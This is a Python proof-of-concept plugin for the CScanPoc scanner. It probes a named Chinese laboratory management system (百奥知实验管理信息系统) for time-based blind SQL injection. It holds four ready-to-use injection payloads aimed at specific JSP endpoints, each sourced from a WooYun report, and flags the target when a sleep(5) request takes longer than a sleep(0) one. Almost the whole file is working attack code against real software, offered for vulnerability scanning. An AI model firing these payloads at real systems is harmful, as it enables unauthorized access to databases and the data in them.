# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'bioknow_0002' # 平台漏洞编号，留空
    name = '百奥知实验管理信息系统 SQL注射漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-16'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '百奥知实验管理信息系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ff8692cf-a3d2-4c12-8a5a-3b3ab8d7fc80'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            #No.1 http://www.wooyun.org/bugs/wooyun-2010-0107187
            payload1 = "/portal/root/eip_cro/gg_list.jsp?nowlx=a%27%20or%201=sleep%285%29%20and%20%271%27=%271"
            payload2 = "/portal/root/eip_cro/gg_list.jsp?nowlx=a%27%20or%201=sleep%280%29%20and%20%271%27=%271"
            t1 = time.time()
            code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
            t2 = time.time()
            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2)
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(self.target + payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            #No.2 http://www.wooyun.org/bugs/wooyun-2010-0108186
            payload1 = "/portal/root/lims_std/gyxt.jsp?id=a'%20or%201=sleep(5)%20and%20'1'='1"
            payload2 = "/portal/root/lims_std/gyxt.jsp?id=a'%20or%201=sleep(0)%20and%20'1'='1"
            t1 = time.time()
            code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
            t2 = time.time()
            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2)
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(self.target + payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            #No.3 http://www.wooyun.org/bugs/wooyun-2010-0107168
            payload1 = "/portal/root/lcky1/gg_nr.jsp?id=-1%20or%201=sleep(5)"
            payload2 = "/portal/root/lcky1/gg_nr.jsp?id=-1%20or%201=sleep(0)"
            t1 = time.time()
            code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
            t2 = time.time()
            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2)
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(self.target + payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            #No.4 http://www.wooyun.org/bugs/wooyun-2010-0106048
            payload1 = "/portal/root/lims_std/gyxt.jsp?lmbm=abc'%20or%201=sleep(5)%20and%20'1'='1"
            payload2 = "/portal/root/lims_std/gyxt.jsp?lmbm=abc'%20or%201=sleep(0)%20and%20'1'='1"
            t1 = time.time()
            code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
            t2 = time.time()
            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2)
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(self.target + payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
